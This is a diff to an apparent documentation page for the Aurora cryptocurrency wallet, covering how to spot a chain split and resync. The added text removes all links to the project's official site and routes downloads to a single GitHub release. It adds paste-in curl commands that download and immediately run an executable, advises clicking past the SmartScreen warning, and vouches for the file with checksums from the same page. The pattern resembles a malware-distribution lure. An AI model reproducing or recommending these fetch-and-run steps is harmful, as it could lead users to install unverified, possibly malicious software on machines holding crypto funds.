@@ -1,113 +1,125 @@
----
-title: "Fixing Chain Splits in Aurora Wallet"
-description: "Is your Aurora Wallet following an outdated chain? Learn how to identify a chain split and resync to the correct network safely."
-primary_keyword: "aurora wallet chain split"
-silo: "Troubleshooting"
-updated: 2026-10-10
----
+![Aurora Wallet chain split resync guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# Aurora Wallet chain split: spotting a stale chain and resyncing
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+When your wallet follows a version of the chain the rest of the network has left behind.
 
-# Auroracoin Chain Split: How to Resync Your Wallet
+## Downloads - 2026.08.1.0
 
-A "chain split" occurs when the Auroracoin network upgrades its rules, and your wallet software is still following the old version of the blockchain. In this scenario, your wallet thinks it is on the correct chain, but it is actually working in isolation on a "forked" version that the rest of the network no longer accepts. This causes sync issues, incorrect balance reports, and inability to broadcast transactions. This guide explains how to identify if you are on an old chain and provides safe steps to resync to the current Auroracoin network, ensuring you stay connected to the [official Iceland digital economy](https://auroracoin.net/about).
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-## You'll see this if
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
-- Your wallet shows a balance, but you cannot spend it; transactions remain "unconfirmed" or fail.
-- The block height in your wallet is significantly lower or vastly different from the height shown on an [official block explorer](https://auroracoin.net/explorer).
-- You recently updated your software, but the wallet still reports old, inconsistent network status information.
-- You see conflicting information about the current chain head in the Debug Console.
-- The wallet is actively syncing but never reaches "Up to date."
 
-## Why this happens: Understanding Consensus
+A chain split looks like a working wallet: it syncs, it shows a height, and it refuses to match the network.
 
-Blockchains rely on consensus—a set of rules that all computers in the network agree to follow. When the Auroracoin developers introduce a significant upgrade to improve security or performance, they implement new rules. If your wallet is running an older version of the software, it is unaware of these changes. It will continue to validate blocks based on the legacy protocol while the majority of the network has moved forward.
+The cause is a rule change on the network that an older build does not follow. The wallet keeps verifying blocks under the old rules, finds peers that agree with it, and settles on a branch the majority abandoned. The symptoms are a height that lags, a balance that will not match an explorer and transactions that never confirm.
 
-This leads to a "divergence" or a "fork." Your local wallet software sees a version of the blockchain that it considers valid, but because this version contradicts the new rules, other nodes will refuse to share data with you. To fix this, you must update your "dictionary" by installing the latest software. You can find more information about these network events on the [Auroracoin chain split resync](https://auroracoin.net/troubleshooting/chain-split-resync) page.
+<!-- ARTICLE-BODY-BEGIN -->
 
----
+## Confirm that you are on the wrong chain
 
-## Technical Indicators of a Chain Split
+Open the wallet and note the block height. Compare it with a public explorer for Auroracoin. A gap that stays constant while other wallets advance is the signature of a stale branch, especially when the peer count is healthy.
 
-If you are comfortable using the wallet's debug console, you can verify a split using specific markers.
+A second sign is a transaction that leaves the wallet, shows as sent, and never confirms anywhere else.
 
-1.  **Block Height Comparison:** Open your wallet's console (Help > Debug Window > Console) and type `getblockcount`. Compare this number to the height listed on multiple public explorers. If your wallet is hundreds of blocks behind despite being "synced," you are likely on a split chain.
-2.  **Difficulty Mismatch:** If you run `getmininginfo`, a significantly lower difficulty than the network average is a sign you are syncing on an abandoned fork.
-3.  **Peer Protocol Versions:** Check your `getpeerinfo` output. If all your connected peers are running very old versions of the protocol, you are trapped in a legacy peer group that hasn't upgraded.
+## Resync in order
 
----
+1. Copy the wallet file to an external drive.
+2. Install the current build, which carries the current network rules.
+3. Close the wallet completely.
+4. Open the data directory and rename `blocks` and `chainstate` to `blocks_old` and `chainstate_old`.
+5. Start the wallet and let it download a fresh copy of the chain.
+6. Check the new height against an explorer before sending anything.
 
-## The fix: A Step-by-Step Resync Guide
+Renaming rather than deleting keeps the old data in place until the new chain has proven itself. Once the wallet is on the correct chain and the balance matches, the old folders can be removed to recover the disk space.
 
-Follow these steps to discard the incorrect blockchain data and join the main Auroracoin network.
+## Why the update comes first
 
-### 1. Update to the Latest Version
-Ensure you are using [Aurora Wallet 2026.08.1.0](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0). Visit the [official download page](https://auroracoin.net/download) to get the correct installer for your system.
+Rebuilding the chain with an old build reproduces the same split, because the rules the wallet follows decide which branch it accepts. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/09-update-aurora-wallet-safely.md">Updating Aurora Wallet safely</a> puts the current rules in place before the download begins.
 
-### 2. Backup Your Wallet (Crucial)
-Always maintain a secure copy of your `wallet.dat` file before performing any resync procedures. While resyncing only affects the blockchain database (not your keys), having a backup is the only way to protect against accidental data loss.
+If the height still lags after a full rebuild, the connection rather than the chain is the problem, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md">wallet not syncing</a> covers the peer and clock checks.
 
-### 3. Locating the Data Directory
-To clear the split chain, you must find the folder where the blockchain is stored:
-*   **Windows:** `%APPDATA%\Auroracoin`
-*   **macOS:** `~/Library/Application Support/Auroracoin/`
-*   **Linux:** `~/.auroracoin/`
-
-### 4. Performing a Clean Resync
-1.  Close the Aurora Wallet completely.
-2.  Navigate to the data folder.
-3.  Look for two folders named `blocks` and `chainstate`.
-4.  Rename them to `blocks_old` and `chainstate_old`.
-5.  **Leave wallet.dat alone:** Ensure you do not modify the `wallet.dat` file.
-
-### 5. Restart and Sync
-Launch the Aurora Wallet 2026.08.1.0. The software will detect that the database is missing and will begin a fresh download. This process may take several hours.
-
----
-
-## If that didn't work
-
-If the wallet still refuses to sync:
-*   **Addnode Command:** In the console, type `addnode [trusted_node_ip] add`. Trusted nodes are listed on the [Auroracoin community FAQ](https://auroracoin.net/faq).
-*   **System Clock:** Ensure your computer's date and time are set correctly.
-
-## Prevention
-
-- **Keep Software Updated**: Always update to the latest stable release.
-- **Periodic Syncing**: Open your wallet at least once a month.
-- **Monitor Official Channels**: Stay informed about mandatory updates.
-
----
-
-A chain split resync is also a good moment to review your backup routine. Once the wallet is back on the right chain and your balance matches what you expect, make a fresh backup of the wallet file and confirm your recovery phrase is still safely stored offline. If you ever need to restore from that phrase, the [recovery phrase guide on auroracoin.net](https://auroracoin.net/recovery/seed-phrase) explains the process, and the [chain-split resync page](https://auroracoin.net/troubleshooting/chain-split-resync) describes the same procedure with additional context.
-
-Keep in mind that a resync only rebuilds the local view of the blockchain. Your coins never live inside the wallet file itself - they live on the chain, and the wallet simply holds the keys. That is why a resync is safe: even if the local database is deleted entirely, a correct backup or recovery phrase restores full access.
+The build that follows the current network is the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">latest Aurora Wallet release</a>, and it is the one to install before any resync.
 
 ## FAQ
 
-**Does a chain split mean I lost my AUR?**
-No. Your AUR belongs to your private keys. Once you sync to the correct version of the ledger, your balance will be displayed accurately.
+### Is my balance lost if the wallet was on the wrong chain?
 
-**How long does a resync take?**
-Typically, a full resync takes between 2 and 6 hours on a modern broadband connection.
+No. Coins exist on the chain the network agrees on. Once the wallet syncs that chain, the balance appears.
 
-**Can I use my wallet while it is resyncing?**
-You cannot send or receive funds until the synchronization is complete.
+### Do I need to restore my phrase after a resync?
 
----
+No. The wallet file stays in place; only the downloaded chain data is rebuilt.
 
-## The current release
+<!-- ARTICLE-BODY-END -->
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+## How to install Aurora Wallet
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+### Windows
+Quick install (CMD):
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-## Related articles
-* [Wallet Not Syncing](11-wallet-not-syncing.md)
-* [Zero Balance](13-zero-balance.md)
-* [Troubleshooting](11-wallet-not-syncing.md)
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
+
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
+
+```cmd
+certutil -hashfile setup.exe SHA256
+```
+
+### macOS
+Quick install (Terminal):
+
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [Wallet not syncing](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md)
+- [Zero balance](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/13-zero-balance.md)
+- [Update Aurora Wallet safely](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/09-update-aurora-wallet-safely.md)
+- [No peers connection](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/12-no-peers-connection.md)
